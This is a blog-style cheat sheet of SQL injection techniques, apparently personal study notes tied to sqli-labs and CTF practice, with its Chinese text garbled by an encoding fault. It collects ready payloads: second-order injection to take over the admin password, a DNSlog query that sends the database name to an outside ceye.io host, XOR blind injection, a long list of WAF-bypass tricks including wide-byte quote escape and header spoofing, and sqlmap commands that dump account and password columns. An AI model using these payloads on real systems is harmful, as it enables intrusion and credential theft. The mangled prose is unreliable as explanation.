<h2 id="äºŒæ¬¡æ³¨å…¥"><a href="#äºŒæ¬¡æ³¨å…¥" class="headerlink" title="äºŒæ¬¡æ³¨å…¥"></a>äºŒæ¬¡æ³¨å…¥</h2><p>åŸç†ï¼šæ”»å‡»è€…æ„é€ æ¶æ„çš„æ•°æ®å¹¶å­˜å‚¨åœ¨æ•°æ®åº“åï¼Œæ¶æ„æ•°æ®è¢«è¯»å–å¹¶è¿›å…¥åˆ°SQLæŸ¥è¯¢è¯­å¥æ‰€å¯¼è‡´çš„æ³¨å…¥ã€‚å³è¾“å…¥æ¶æ„çš„æ•°æ®åº“æŸ¥è¯¢è¯­å¥æ—¶ä¼šè¢«è½¬ä¹‰ï¼Œä½†åœ¨æ•°æ®åº“è°ƒç”¨è¯»å–è¯­å¥æ—¶åˆè¢«è¿˜åŸå¯¼è‡´è¯­å¥æ‰§è¡Œã€‚</p>
<p><code>sqli-labs_Less24</code>ä¸ºä¾‹ï¼š</p>
<p>å…ˆæ³¨å†Œä¸€ä¸ªåä¸º<code>admin&#39;#</code>çš„ç”¨æˆ·ï¼Œç„¶åç™»å½•æ”¹å¯†ç ã€‚</p>
<p>æ›´æ”¹å¯†ç ç”¨çš„è¯­å¥ï¼š</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;$username&#39; and password&#x3D;&#39;$curr_pass&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>è¿™é‡Œ<code>username</code>æ˜¯<code>admin&#39;#</code>ï¼Œæ‰€ä»¥è¯­å¥å˜æˆäº†ï¼š</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;admin&#39;#&#39; and password&#x3D;&#39;$curr_pass&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><code>#</code>åé¢çš„éƒ½è¢«æ³¨é‡Šäº†ã€‚å˜æˆäº†æ›´æ”¹<code>admin</code>çš„å¯†ç ã€‚</p>
<p>å¯ä»¥ç”¨æ›´æ”¹åçš„å¯†ç ç™»å½•adminï¼Œæˆ–è€…ç»“åˆ<code>æŠ¥é”™/ç›²æ³¨</code>è¿›è¡Œæ•°æ®åº“æ³¨å…¥ã€‚</p>
<h2 id="dnslogæ³¨å…¥"><a href="#dnslogæ³¨å…¥" class="headerlink" title="dnslogæ³¨å…¥"></a>dnslogæ³¨å…¥</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Xy--1/p/12896599.html">DNSlogæ³¨å…¥å­¦ä¹  - Lushun - åšå®¢å›­ (cnblogs.com)</a></p>
<p>æˆ‘çš„ï¼š<a target="_blank" rel="noopener" href="http://ceye.io/">CEYE - ç›‘æ§æœåŠ¡ä»¥è¿›è¡Œå®‰å…¨æµ‹è¯•</a></p>
<p>paylaodï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.xhmmod.ceye.io&#x2F;abc&#39;));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h2><p>å †å æ³¨å…¥ï¼Œé¡¾åæ€ä¹‰ï¼Œå°±æ˜¯å°†è¯­å¥å †å åœ¨ä¸€èµ·è¿›è¡ŒæŸ¥è¯¢</p>
<p><code>;</code></p>
<h2 id="åŸºæœ¬å‡½æ•°å‚è€ƒ"><a href="#åŸºæœ¬å‡½æ•°å‚è€ƒ" class="headerlink" title="åŸºæœ¬å‡½æ•°å‚è€ƒ"></a>åŸºæœ¬å‡½æ•°å‚è€ƒ</h2><table>
<thead>
<tr>
<th>å‡½æ•°</th>
<th>è§£é‡Š</th>
<th>payload</th>
</tr>
</thead>
<tbody><tr>
<td>database()</td>
<td>æ•°æ®åº“å</td>
<td></td>
</tr>
<tr>
<td>user()</td>
<td>ç”¨æˆ·å</td>
<td></td>
</tr>
<tr>
<td>version()</td>
<td>æ•°æ®åº“ç‰ˆæœ¬</td>
<td></td>
</tr>
<tr>
<td>@@version_compile_os</td>
<td>æ“ä½œç³»ç»Ÿ</td>
<td></td>
</tr>
<tr>
<td>concat()</td>
<td>æ²¡æœ‰åˆ†éš”ç¬¦çš„è¿æ¥å­—ç¬¦ä¸²</td>
<td>concat(a,b)</td>
</tr>
<tr>
<td>concat_ws()</td>
<td>å«æœ‰åˆ†éš”ç¬¦çš„è¿æ¥å­—ç¬¦ä¸²</td>
<td>concat_ws(â€˜:â€™,a,b)</td>
</tr>
<tr>
<td>group_concat()</td>
<td>ä¸€è¡Œæ˜¾ç¤ºå‡ºæ¥ï¼Œå¹¶ä»¥é€—å·åˆ†éš”æ¯ä¸€æ¡æ•°æ®</td>
<td></td>
</tr>
<tr>
<td>left(a,b)</td>
<td>ä»å·¦ä¾§æˆªå–açš„å‰bä½</td>
<td>left(database(),1)&#x3D;â€™sâ€™</td>
</tr>
<tr>
<td>right(a,b)</td>
<td>ä»å³ä¾§æˆªå–açš„å‰bä½</td>
<td></td>
</tr>
<tr>
<td>regexp()</td>
<td>user()çš„ç»“æœæ˜¯rootï¼Œregexpä¸ºåŒ¹é…rootçš„æ­£åˆ™è¡¨è¾¾å¼</td>
<td>select user() regexp â€˜râ€™</td>
</tr>
<tr>
<td>substr(a,b,c)</td>
<td>ä»bä½ç½®å¼€å§‹ï¼Œæˆªå–aå­—ç¬¦ä¸²çš„cé•¿åº¦</td>
<td></td>
</tr>
<tr>
<td>mid(a,b,c)</td>
<td>ä»bä½ç½®å¼€å§‹ï¼Œæˆªå–aå­—ç¬¦ä¸²çš„cä½</td>
<td></td>
</tr>
<tr>
<td>length()</td>
<td>è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦</td>
<td></td>
</tr>
<tr>
<td>ascii()</td>
<td>å°†å­—ç¬¦ä¸²è½¬åŒ–ä¸ºasciiå€¼</td>
<td>\</td>
</tr>
<tr>
<td>like</td>
<td>ä¸regexpç›¸ä¼¼</td>
<td>select user() like â€˜ro%â€™</td>
</tr>
<tr>
<td>load_file()</td>
<td>è¯»å–æœ¬åœ°æ–‡ä»¶</td>
<td>select load_file(â€˜æ–‡ä»¶è·¯å¾„â€™)</td>
</tr>
<tr>
<td>into outfile</td>
<td>å†™æ–‡ä»¶(æ³¨æ„&#x2F;&#x2F;åŒå†™)</td>
<td>select â€˜å¥å­â€™ into outfile â€˜æ–‡ä»¶è·¯å¾„åŠåç§°â€™</td>
</tr>
</tbody></table>
<h2 id="æ³¨é‡Šç¬¦ä½¿ç”¨"><a href="#æ³¨é‡Šç¬¦ä½¿ç”¨" class="headerlink" title="æ³¨é‡Šç¬¦ä½¿ç”¨"></a>æ³¨é‡Šç¬¦ä½¿ç”¨</h2><p>ï¼ˆGETæäº¤æ–¹å¼ï¼‰ï¼š</p>
<p>ã€€ã€€ â€“ ï¼ˆåé¢æœ‰ç©ºæ ¼ï¼‰</p>
<p>ã€€ã€€ %23</p>
<p>ã€€ã€€payloadç»“å°¾å•å¼•å·é—­åˆ</p>
<p>ï¼ˆPOSTæäº¤æ–¹å¼ï¼‰ï¼š</p>
<p>ã€€ã€€ â€“ ï¼ˆåé¢æœ‰ç©ºæ ¼ï¼‰</p>
<p>ã€€ã€€ #</p>
<p>ã€€ã€€ payloadç»“å°¾å•å¼•å·é—­åˆ</p>
<h2 id="å¼‚æˆ–æ³¨å…¥"><a href="#å¼‚æˆ–æ³¨å…¥" class="headerlink" title="å¼‚æˆ–æ³¨å…¥"></a>å¼‚æˆ–æ³¨å…¥</h2><p>å½“ <code>union</code>,<code>and</code> è¢«å®Œå…¨è¿‡æ»¤æ‰äº†,å°±å¯ä»¥è€ƒè™‘ä½¿ç”¨å¼‚æˆ–æ³¨å…¥ </p>
<p>å¼‚æˆ–è¿ç®—è§„åˆ™: </p>
<p>&#x3D;&#x3D;1^1&#x3D;0	0^0&#x3D;0	0^1&#x3D;1&#x3D;&#x3D;</p>
<p>1^ 1^1&#x3D;0	1^ 1^0&#x3D;0</p>
<p>&#x3D;&#x3D;ä¸¤çœŸä¸ºå‡ï¼Œä¸¤å‡ä¸ºçœŸ&#x3D;&#x3D;</p>
<p><code>xor</code> æ˜¯é€»è¾‘ä¸Šçš„å¼‚æˆ–æ“ä½œï¼›<code>^</code> æ˜¯å‰åè¿›è¡ŒäºŒè¿›åˆ¶å±‚é¢çš„å¼‚æˆ–è¿ç®—</p>
<p>0^(ascii(substr((select(flag)from(flag)),1,1))&gt;1)</p>
<hr>
<h2 id="WAFç»•è¿‡"><a href="#WAFç»•è¿‡" class="headerlink" title="WAFç»•è¿‡"></a>WAFç»•è¿‡</h2><ol>
<li><p>å¤§å°å†™</p>
</li>
<li><p>å…³é”®å­—é‡å¤ï¼ˆåŒå†™ï¼‰</p>
</li>
<li><p>å…³é”®å­—æ›¿æ¢</p>
<p>â€‹	<code>and</code> â€“&gt; <code>&amp;&amp;</code>        <code>or</code> â€“&gt; <code>||</code>         <code>like</code>â€“&gt; <code>=</code>        <code>&lt;&gt;</code>â€“&gt; <code>!=</code></p>
</li>
<li><p>fuzzå¤§æ³•</p>
</li>
<li><p>æ³¨é‡Šç¬¦ç»•è¿‡</p>
<p><code>/**/</code>ç©ºæ ¼ç”¨è¿™ä¸ªæ›¿æ¢</p>
<p>&#x2F;* è¿™é‡Œå¯ä»¥å¡«å†™å¾ˆå¤šå†…å®¹  *&#x2F; </p>
<p>å†…è”æ³¨é‡Šï¼š<code>/*!union select */</code> é‡Œé¢çš„ä¸œè¥¿æ˜¯å¯ä»¥æ­£å¸¸è¿è¡Œçš„ï¼Œmysqlç‰¹æ€§ã€‚</p>
</li>
<li><p>ç‰¹æ®Šç¬¦å·ç»•è¿‡</p>
<p>mysql ç©ºç™½ç¬¦ï¼š %09; %0A; %0B; %0D; %20; %0C; %A0; &#x2F;* xxx *&#x2F;</p>
<p>æ­£åˆ™ç©ºç™½ç¬¦ï¼š%09; %0A; %0B; %0D; %20;        %25å°±æ˜¯ç™¾åˆ†å·</p>
<p><code>union%23a%0aselect 1,2,3--+</code></p>
</li>
<li><p>å‡½æ•°åˆ†å‰²ç¬¦å·  <code>concat/**/()</code>      <code>concat%2520()</code></p>
</li>
<li><p>æµ®ç‚¹æ•°æ³•      <code>1E0</code>è¡¨ç¤º <code>1*10^0</code></p>
</li>
<li><p>åŠ å¯†è§£å¯†</p>
</li>
<li><p>ç¼–ç è§£ç </p>
</li>
<li><p>ç­‰ä»·å‡½æ•°æ›¿æ¢</p>
</li>
<li><p>æ›´æ”¹æäº¤æ–¹å¼</p>
</li>
<li><p>mysqlé»‘è¯­æ³•</p>
<p>select {x schema_name} from {x information_scheam.schemata};</p>
<p>select {x 1};</p>
</li>
<li><p>å½“å¼€å¯äº†é­”æœ¯å‡½æ•°&#x3D;&#x3D;è¿‡æ»¤äº†å¼•å·&#x3D;&#x3D;æ—¶ï¼Œå¯ä»¥åœ¨å¼•å·å‰åŠ ä¸Šä¸€ä¸ªæ±‰å­—åŒå­—èŠ‚ç¼–ç ï¼Œå¯ä»¥å®ç°ç»•è¿‡ã€‚</p>
<p>ä¾‹å¦‚æ„é€ Payloadä¸ºï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">username&#x3D;%BF&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>%BFè§£ç ä¹‹åæ˜¯ä¸­æ–‡ä¹±ç </p>
</li>
<li><p>ç”¨ &#x3D;&#x3D;&#x2F;*!50000%53elect*&#x2F;&#x3D;&#x3D; ä»£æ›¿selectå®ç°ç»•è¿‡</p>
<pre class="line-numbers language-none"><code class="language-none">select
&#x2F;*!50000%53elect*&#x2F;
order 
 &#x2F;*!50000%6Frder*&#x2F;
union
&#x2F;*!50000%75nion*&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>httpå‚æ•°æ±¡æŸ“ï¼Œæ¯”å¦‚PHP&#x2F;Apacheçš„æœåŠ¡å™¨getæ–¹å¼æäº¤æ—¶å­˜åœ¨å¤šä¸ªç›¸åŒçš„å‚æ•°åï¼Œåªæœ‰æœ€åä¸€ä¸ªç”Ÿæ•ˆã€‚ï¼ˆä¸åŒä¸­é—´ä»¶è§„åˆ™ä¸åŒï¼‰</p>
<pre class="line-numbers language-none"><code class="language-none">ä¾‹ï¼š?id&#x3D;1&#x2F;**&amp;id&#x3D;-1 union select 1,2,3#*&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>ipç™½åå•ï¼Œæ”¹<code>X-forwarded-for</code>ã€<code>X-remote-IP</code>ã€<code>X-originating-IP</code>ã€<code>X-remote-addr</code>ã€<code>X-Real-IP</code></p>
</li>
<li><p>é™æ€èµ„æº</p>
</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php?id&#x3D;1 and 1&#x3D;1
http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php&#x2F;x.txt?id&#x3D;1 and 1&#x3D;1	ä¾ç„¶æ­£å¸¸è¿è¡Œ
http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php&#x2F;admin.php?id&#x3D;1 and 1&#x3D;1	admin.phpæ˜¯åœ¨ç™½åå•é‡Œçš„æ²¡æœ‰æ‹¦æˆª<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<ol start="19">
<li><p>çˆ¬è™«ç™½åå•</p>
</li>
<li><p>å½“è¿‡æ»¤äº†<code>information_schema</code>æ—¶<br>å¯ä»¥ç”¨<code>mysql.innodb_table_stats</code>ä»£æ›¿<code>information_schema</code></p>
<p>InnoDbå¼•æ“<br>ä»MYSQL5.5.8å¼€å§‹ï¼ŒInnoDBæˆä¸ºå…¶é»˜è®¤å­˜å‚¨å¼•æ“ã€‚è€Œåœ¨MYSQL5.6ä»¥ä¸Šçš„ç‰ˆæœ¬ä¸­ï¼Œinndbå¢åŠ äº†<code>innodb_index_stats</code>å’Œ<code>innodb_table_stats</code>ä¸¤å¼ è¡¨ï¼Œè¿™ä¸¤å¼ è¡¨ä¸­éƒ½å­˜å‚¨äº†æ•°æ®åº“å’Œå…¶æ•°æ®è¡¨çš„ä¿¡æ¯ï¼Œä½†æ˜¯æ²¡æœ‰å­˜å‚¨åˆ—åã€‚</p>
<p>sysæ•°æ®åº“<br>åœ¨5.7ä»¥ä¸Šçš„MYSQLä¸­ï¼Œæ–°å¢äº†sysæ•°æ®åº“ï¼Œè¯¥åº“çš„åŸºç¡€æ•°æ®æ¥è‡ª<code>information_schema</code>å’Œ<code>performance_chema</code>ï¼Œå…¶æœ¬èº«ä¸å­˜å‚¨æ•°æ®ã€‚å¯ä»¥é€šè¿‡å…¶ä¸­çš„<code>schema_auto_increment_columns</code>æ¥è·å–è¡¨åã€‚</p>
</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">1&amp;&amp;ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()),1,1))&#x3D;103

2||ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()),&#123;&#125;,1))&#x3D;&#123;&#125;.format()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<hr>
<h1 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h1><p>sqlmapã€NoSQLAttackã€Pangolin</p>
<p>Sqlmapä½¿ç”¨ï¼š</p>
<p>ä¸€èˆ¬ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u &quot;url&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>åŠ ä¸Š<strong>è„šæœ¬</strong>ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u &quot;url&quot; --tamper&#x3D;xxx.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å¼€<strong>ä»£ç†</strong>ï¼ˆä¸€èˆ¬ç”¨äºburpæŠ“åŒ…åˆ†æï¼‰ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u &quot;url&quot; --proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>éšæœº<strong>Agent</strong>å¤´ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u &quot;url&quot; --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æŒ‡å®šçˆ¬è™«Agent(ç™¾åº¦)ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u &quot;url&quot; --user-agent&#x3D;&quot;Mozilla&#x2F;5.0 (compatible; Baiduspider&#x2F;2.0; +http:&#x2F;&#x2F;www.baidu.com&#x2F;search&#x2F;spider.html)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>åŠ <strong>å»¶è¿Ÿ</strong>ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u &quot;url&quot; --delay 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>é‡å†™httpå¤´</strong>ï¼Œå¯ä»¥å€Ÿç…§postæ–¹å¼ï¼Œç›´æ¥ä»¥æ•°æ®åŒ…å½¢å¼æ‰«ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -r æ•°æ®åŒ…æ–‡ä»¶ <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å‚æ•°å€¼å­˜åœ¨ç¼–ç æƒ…å†µï¼Œ<strong>ä¸­è½¬æ³¨å…¥</strong>ï¼Œåœ¨æœ¬åœ°å†™ä¸€ä¸ªï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$url</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
<span class="token variable">$payload</span><span class="token operator">=</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$payload</span><span class="token punctuation">;</span>
<span class="token variable">$urls</span><span class="token operator">=</span><span class="token variable">$url</span><span class="token operator">.</span><span class="token variable">$payload</span><span class="token punctuation">;</span>
<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$urls</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$urls</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>sqlmapæ³¨å…¥æœ¬åœ°è„šæœ¬åœ°å€â€”-ã€‹æœ¬åœ°æ­å»ºè„šæœ¬ï¼ˆè¯·æ±‚æ•°æ®è‡ªå®šä¹‰ç¼–å†™ï¼‰è®¿é—®è¿œç¨‹åœ°å€</p>
<hr>
<p>è·å–å½“å‰<strong>æ•°æ®åº“</strong></p>
<p>sqlmap -u ç½‘å€ â€“forms â€“batch â€“current-db</p>
<p>è·å–gkkåº“çš„<strong>è¡¨</strong></p>
<p>sqlmap -u ç½‘å€ â€“forms â€“batch -D gkk â€“tables</p>
<p>è·å–userçš„<strong>åˆ—</strong></p>
<p>sqlmap -u ç½‘å€ â€“forms â€“batch -D gkk -T user â€“columns</p>
<p>è·å–è´¦å·å¯†ç <strong>å­—æ®µ</strong></p>
<p>sqlmap -u ç½‘å€ â€“forms â€“batch -D gkk -T user -C uname,pwd,vip â€“dump</p>
<hr>
<p><strong>å‚æ•°</strong>ï¼š</p>
<p>â€“bannerï¼šæŒ‡çº¹ä¿¡æ¯</p>
<p>â€“batchï¼šä½¿ç”¨éäº¤äº’å¼æ‰«æï¼ŒSQLMapå°†ä¸ä¼šè¯¢é—®</p>
<p>â€“dbsï¼šè·å–æ•°æ®åº“åˆ—è¡¨</p>
<p>â€“tablesï¼šè·å–æ‰€æœ‰çš„æ•°æ®è¡¨</p>
<p>â€“columnsï¼šè·å–æ‰€æœ‰å­—æ®µ(åˆ—)</p>
<p>â€“dumpï¼šè·å–è¡Œæ•°æ®</p>
<p>-Dï¼šæŒ‡å®šæ•°æ®åº“</p>
<p>-Tï¼šæŒ‡å®šæ•°æ®è¡¨</p>
<p>-Cï¼šæŒ‡å®šå­—æ®µï¼Œç”¨é€—å·é—´éš”</p>
<p>â€“userï¼šå½“å‰ç”¨æˆ·</p>
<p>â€“current-dbï¼šå½“å‰æ•°æ®åº“</p>
<p>â€“is-dbaï¼šæ˜¯å¦ä¸ºDBA(Database Administrator)</p>
<p>â€“form åˆ¶ä½œè¡¨æ ¼</p>

  <p><a class="classtest-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQLæ³¨å…¥</a>, <a class="classtest-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">webå®‰å…¨</a> â€” 2021å¹´11æœˆ23æ—¥</p>
  


        </div>
        <div class="row mt-2">
  <h3>Search</h3>
  <div><input id="search-text" title="search" class="search-text" type="text" placeholder="search......"></div>
  <div style="margin-top: 1.5rem;">
    <ul id="result"></ul>
  </div>
</div>
        <div class="row mt-2">
  
    <div class="eight columns">
      <p id="madewith">Made with â¤ and
        <a class="footer-link icon" href="https://hexo.io" target="_blank" style="text-decoration: none;" rel="noreferrer" aria-label="Hexo.io">
        <svg class="hexo svg-hov" width="14" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><title>Hexo.js</title><path d="M12 .007L1.57 6.056V18.05L12 23.995l10.43-6.049V5.952L12 .007zm4.798 17.105l-.939.521-.939-.521V12.94H9.08v4.172l-.94.521-.938-.521V6.89l.939-.521.939.521v4.172h5.84V6.89l.94-.521.938.521v10.222z"/></svg>
        </a>
        
    </div>

    <!-- Sepcial thanks to https://simpleicons.org/ for the icons -->
    <div class="four columns mb-3 posisi" >
      
      <a class="ml-0 footer-link icon" href="https://github.com/" target="_blank" style="text-decoration: none" rel="noreferrer" aria-label="GitHub">
        <svg class="github svg-hov" width="18" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
      </a>
      

      

      
      <a class="ml-0 footer-link icon" href="https://twitter.com/" target="_blank" style="text-decoration: none" rel="noreferrer" aria-label="Twitter">
        <svg class="twitter svg-hov" width="18" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>Twitter</title><path d="M23.954 4.569c-.885.389-1.83.654-2.825.775 1.014-.611 1.794-1.574 2.163-2.723-.951.555-2.005.959-3.127 1.184-.896-.959-2.173-1.559-3.591-1.559-2.717 0-4.92 2.203-4.92 4.917 0 .39.045.765.127 1.124C7.691 8.094 4.066 6.13 1.64 3.161c-.427.722-.666 1.561-.666 2.475 0 1.71.87 3.213 2.188 4.096-.807-.026-1.566-.248-2.228-.616v.061c0 2.385 1.693 4.374 3.946 4.827-.413.111-.849.171-1.296.171-.314 0-.615-.03-.916-.086.631 1.953 2.445 3.377 4.604 3.417-1.68 1.319-3.809 2.105-6.102 2.105-.39 0-.779-.023-1.17-.067 2.189 1.394 4.768 2.209 7.557 2.209 9.054 0 13.999-7.496 13.999-13.986 0-.209 0-.42-.015-.63.961-.689 1.8-1.56 2.46-2.548l-.047-.02z"/></svg>
      </a>
      

      
      <a class="ml-0 footer-link icon" href="https://instagram.com/" target="_blank" style="text-decoration: none" rel="noreferrer" aria-label="Instagram">
        <svg class="instagram svg-hov" width="18" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>Instagram</title><path d="M12 0C8.74 0 8.333.015 7.053.072 5.775.132 4.905.333 4.14.63c-.789.306-1.459.717-2.126 1.384S.935 3.35.63 4.14C.333 4.905.131 5.775.072 7.053.012 8.333 0 8.74 0 12s.015 3.667.072 4.947c.06 1.277.261 2.148.558 2.913.306.788.717 1.459 1.384 2.126.667.666 1.336 1.079 2.126 1.384.766.296 1.636.499 2.913.558C8.333 23.988 8.74 24 12 24s3.667-.015 4.947-.072c1.277-.06 2.148-.262 2.913-.558.788-.306 1.459-.718 2.126-1.384.666-.667 1.079-1.335 1.384-2.126.296-.765.499-1.636.558-2.913.06-1.28.072-1.687.072-4.947s-.015-3.667-.072-4.947c-.06-1.277-.262-2.149-.558-2.913-.306-.789-.718-1.459-1.384-2.126C21.319 1.347 20.651.935 19.86.63c-.765-.297-1.636-.499-2.913-.558C15.667.012 15.26 0 12 0zm0 2.16c3.203 0 3.585.016 4.85.071 1.17.055 1.805.249 2.227.415.562.217.96.477 1.382.896.419.42.679.819.896 1.381.164.422.36 1.057.413 2.227.057 1.266.07 1.646.07 4.85s-.015 3.585-.074 4.85c-.061 1.17-.256 1.805-.421 2.227-.224.562-.479.96-.899 1.382-.419.419-.824.679-1.38.896-.42.164-1.065.36-2.235.413-1.274.057-1.649.07-4.859.07-3.211 0-3.586-.015-4.859-.074-1.171-.061-1.816-.256-2.236-.421-.569-.224-.96-.479-1.379-.899-.421-.419-.69-.824-.9-1.38-.165-.42-.359-1.065-.42-2.235-.045-1.26-.061-1.649-.061-4.844 0-3.196.016-3.586.061-4.861.061-1.17.255-1.814.42-2.234.21-.57.479-.96.9-1.381.419-.419.81-.689 1.379-.898.42-.166 1.051-.361 2.221-.421 1.275-.045 1.65-.06 4.859-.06l.045.03zm0 3.678c-3.405 0-6.162 2.76-6.162 6.162 0 3.405 2.76 6.162 6.162 6.162 3.405 0 6.162-2.76 6.162-6.162 0-3.405-2.76-6.162-6.162-6.162zM12 16c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4zm7.846-10.405c0 .795-.646 1.44-1.44 1.44-.795 0-1.44-.646-1.44-1.44 0-.794.646-1.439 1.44-1.439.793-.001 1.44.645 1.44 1.439z"/></svg>
      </a>
      

      

    </div>
  
</div>
<script src="/js/prism/prism.js" async></script>
      </div>

    </div>

  </div>
  <script src="/js/nanobar.min.js"></script>

  <script>
    var options = {
      classname: 'nanobar',
      id: 'myNanobar'
    };
    var nanobar = new Nanobar(options);
    nanobar.go(30);
    nanobar.go(76);
    nanobar.go(100);
  </script>

</body>

</html>